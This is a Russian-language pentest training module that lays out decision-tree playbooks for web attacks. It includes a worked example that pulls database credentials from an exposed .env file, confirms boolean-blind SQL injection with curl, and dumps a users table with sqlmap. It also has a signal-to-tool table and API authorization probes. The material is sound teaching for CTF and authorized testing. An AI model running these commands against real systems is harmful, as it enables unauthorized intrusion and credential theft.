Знать отдельные уязвимости и инструменты — половина дела. Вторая половина — **решать, что делать в следующий момент**: увидел ответ `Server: nginx`, нашёл форму логина, поймал отражение `'` в ответе, скачал файл через `?file=`, получил SSRF — и что теперь? Именно на этот вопрос отвечает этот модуль: пять **плейбуков-деревьев решений** с точными командами на каждой ветке и условиями перехода.

Плейбук — это не справочник по инструменту (для этого есть `web-tool-*`) и не теория класса (для этого есть `web-sqli`, `web-ssrf`, `web-auth-*`). Это **маршрут**: «если сработало — иди сюда, если нет — пробуй это, а вот здесь обычно тупик».

## Что покрывает этот модуль

| Плейбук | Точка входа («я нашёл...») | Выход |
|---------|----------------------------|-------|
| `web-playbook-recon-to-foothold` | у меня есть URL цели | первый подтверждённый вектор эксплуатации |
| `web-playbook-injection-triage` | возможная инъекция (эхо `'`, ошибка БД, задержка) | дамп данных или RCE |
| `web-playbook-auth-bypass` | форму логина / админ-панель | доступ к чужому аккаунту или админке |
| `web-playbook-file-to-rce` | загрузку файла / LFI / traversal | исполнение кода (webshell) |
| `web-playbook-ssrf-to-internal` | SSRF (сервер ходит по моему URL) | доступ к внутреннему сервису / метаданным / RCE |

## Как пользоваться плейбуком

1. **Определите точку входа.** Плейбук выбирается по тому, что у вас уже есть на руках, а не по тому, что вы хотите найти.
2. **Идите по дереву сверху вниз.** На каждом узле — конкретная проверка (команда) и **условие ветвления** (что означает результат).
3. **Не пропускайте «дешёвые» ветки.** Дефолтные креды, `.git`, открытый Swagger, `robots.txt` — это минуты работы и иногда сразу foothold.
4. **Фиксируйте отрицательные результаты.** «Пробовал `'` — ответ не изменился» — тоже ценный вывод: он закрывает ветку и экономит время вам и коллегам.
5. **Не застревайте.** Если ветка не даёт движения за N попыток — вернитесь на уровень выше и возьмите соседнюю. В каждом плейбуке есть раздел «если не сработало» и «тупики».

## Общий каркас любого веб-теста

Все пять плейбуков — это раскрытие одного и того же цикла:

```
   ┌───────────────────────────────────────────────────────────────┐
   │ 1. RECON      что это за цель: стек, версии, эндпоинты         │
   │       │                                                        │
   │ 2. MAP        какие есть входы: параметры, формы, API, файлы   │
   │       │                                                        │
   │ 3. TRIAGE     что подозрительно: ошибки, эхо, задержки, ID     │
   │       │                                                        │
   │ 4. CONFIRM    воспроизвести одной командой (curl/PoC)          │
   │       │                                                        │
   │ 5. ESCALATE   от «нашёл» к «получил данные / код / доступ»     │
   │       │                                                        │
   │ 6. PIVOT      использовать доступ как точку входа дальше       │
   └───────────────────────────────────────────────────────────────┘
```

Плейбук `recon-to-foothold` описывает шаги 1–4, остальные четыре — шаг 5 для конкретного класса.

## Правила перехода между ветками

- **Сначала дешёвое, потом дорогое.** Дефолтные креды и листинг каталогов проверяются раньше, чем вы начнёте писать payload'ы.
- **Один инструмент — одно доказательство.** Нашли что-то сканером — воспроизведите `curl`. Подозрение без воспроизведения — не находка.
- **Кодируйте под контекст.** Один и тот же payload в JSON, в query-строке, в заголовке и в multipart ведёт себя по-разному.
- **Не ломайте цель.** Не `DROP TABLE`, не массовые удаления, не `--os-shell` на продакшене без согласования. Везде, где действие может изменить данные, плейбук помечает это явно.

## Частые ошибки при работе по плейбуку

- **Прыгнуть сразу к «крутой» ветке.** Все начинают с SQLi/SSRF, а foothold часто лежит в `/.git/config` или дефолтном `admin:admin`.
- **Игнорировать отрицательный результат.** Если не записали, что ветка мертва, — потратите на неё время снова.
- **Одна техника — один раз.** Если `UNION` не сработал, это не значит «нет SQLi» — это значит «попробуй error/boolean/time».
- **Забыть про контекст.** Фильтр `'` может блокировать кавычку, но пропускать `0x27`, `char(39)`, URL-encoding или Unicode-нормализацию.
- **Остановиться на подтверждении.** «Сервер сходил на 169.254.169.254» — это не финал, финал — это креды/токен/шелл.

## Что считается «готовым результатом» на каждом этапе

Плейбук заканчивается не тогда, когда вы «посмотрели», а когда у вас на руках артефакт. Полезно держать в голове критерий выхода:

| Этап | Критерий «сделано» | Артефакт |
|------|--------------------|----------|
| Recon | известен стек, версии и карта входов | `httpx.json`, список эндпоинтов |
| Triage | найдено отклонение в ответе (ошибка/эхо/задержка/ID) | команда `curl` + скриншот ответа |
| Confirm | воспроизводится стабильно | одна команда + ответ |
| Escalate | получены данные / код / доступ | дамп, `id`, чужой объект |
| Pivot | доступ превращён в следующий шаг | новый сегмент, шелл, креды |

Если артефакта нет — этап не закрыт, и отрицательный результат тоже нужно зафиксировать: он закрывает ветку для вас и коллег.

## Разобранный пример: прохождение плейбука от URL до дампа

Покажем, как выглядит работа по плейбуку целиком. Цель — `https://shop.target.local`. Начинаем с дешёвых веток.

```bash
# 1. стек
$ httpx -u https://shop.target.local -sc -title -td
https://shop.target.local [200] [Shop] [nginx, PHP/8.1, MySQL]

# 2. открытые артефакты
$ curl -so /dev/null -w '%{http_code} .env\n' https://shop.target.local/.env
200 .env
$ curl -s https://shop.target.local/.env | grep -i db_
DB_HOST=127.0.0.1
DB_USER=shop
DB_PASS=Sh0pP@ss
```

Дешёвая ветка дала креды БД. Дальше — триаж инъекций на найденном параметре.

```bash
$ curl -s 'https://shop.target.local/product?id=1' | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1'" | wc -c
0
$ curl -s "https://shop.target.local/product?id=1 AND 1=1-- -" | wc -c
4821
$ curl -s "https://shop.target.local/product?id=1 AND 1=2-- -" | wc -c
0
```

Boolean-blind подтверждён. Автоматизируем.

```bash
$ sqlmap -r req.txt -p id --batch --technique=B -D shop -T users --dump
+-------+----------------------------------+
| user  | password                         |
+-------+----------------------------------+
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+-------+----------------------------------+
```

Артефакт получен. Ветка закрыта, находки зафиксированы.

## Как вести журнал и фиксировать тупики

Журнал — половина успеха плейбука. Для каждого шага пишите: вектор, команда, результат. «`'` в `id` — размер не изменился, ошибки нет, задержки нет» — это закрытая ветка, к которой не нужно возвращаться. Без журнала вы (и коллеги) повторите тот же путь. Формат простой: одна строка на проверку.

```bash
echo "$(date +%T) id: quote -> no change, no error, no delay" >> /tmp/notes.txt
echo "$(date +%T) .env -> 200, creds extracted" >> /tmp/notes.txt
```

## Что делать дальше / решение

Двигайтесь по плейбуку сверху вниз: дешёвые ветки (артефакты, креды, дефолтные пароли) → триаж инъекций → авторизация → эксплуатация. Каждую находку доводите до артефакта, каждый тупик записывайте. Нет движения за N попыток — возврат на уровень выше и соседняя ветка. И помните: плейбук — это маршрут, а не догма; цель — артефакт, а не «пройденные шаги».

## Таблица «сигнал → ветка → инструмент»

Плейбук работает, когда вы быстро сопоставляете сигнал с веткой. Держите эту таблицу под рукой.

| Сигнал | Ветка | Инструмент |
|--------|-------|-----------|
| форма логина | auth | curl (дефолты, SQLi), jwt_tool |
| параметр `url=`/`file=` | SSRF/LFI | curl, gopher, ffuf |
| загрузка файла | file-to-rce | curl -F, обходы типа/расширения |
| `Set-Cookie` с JWT | auth | jwt_tool |
| `rO0AB`/`O:` в теле | deser | ysoserial/phpggc |
| эхо кавычки / ошибка БД | injection | sqlmap, curl |
| отражение ввода | XSS | dalfox, curl |
| ID в ответе | IDOR | curl, ffuf |
| `Range` в статике | DoS | curl |
| открытый редирект | chain | curl, OAuth |

## Как адаптировать плейбук под цель

Плейбук — каркас, а не жёсткий сценарий. Адаптируйте его под контекст. Если цель — SPA/API, начните с инвентаризации эндпоинтов и авторизации, а не с каталогов. Если цель — админка на известном фреймворке, сразу проверьте версии и CVE. Если цель — мобильный API, начните с обхода pinning и поиска скрытых эндпоинтов. Общий каркас (дешёвое → дорогое, от примитива к артефакту, фиксация тупиков) остаётся, но порядок веток меняется под поверхность.

```bash
# адаптация под API: сначала инвентаризация, потом авторизация
curl -s https://t/openapi.json | jq '.paths | keys'
curl -s -b jar https://t/api/admin | jq .   # BFLA
curl -s -b jar https://t/api/users/1 | jq . # BOLA
```

## Что делать дальше / решение

Ведите тест как маршрут: дешёвые ветки, затем триаж, затем эксплуатация. Сопоставляйте сигналы с ветками по таблице, адаптируйте порядок под поверхность, каждую находку доводите до артефакта, каждый тупик фиксируйте. Нет движения — возврат на уровень выше. И помните: цель плейбука — не «пройти шаги», а получить артефакт, доказывающий уязвимость.

## Где пригодится

- **CTF (Web):** когда непонятно, за что взяться, плейбук задаёт порядок шагов и не даёт застрять.
- **Bug bounty:** дисциплина «сначала дешёвое, потом дорогое» экономит время на scope с сотнями хостов.
- **Пентест:** воспроизводимый маршрут легко превращается в отчёт с доказательствами на каждом шаге.
- **Работа (SOC/AppSec):** понимание типичных переходов между шагами помогает при триаже и обучении команды.
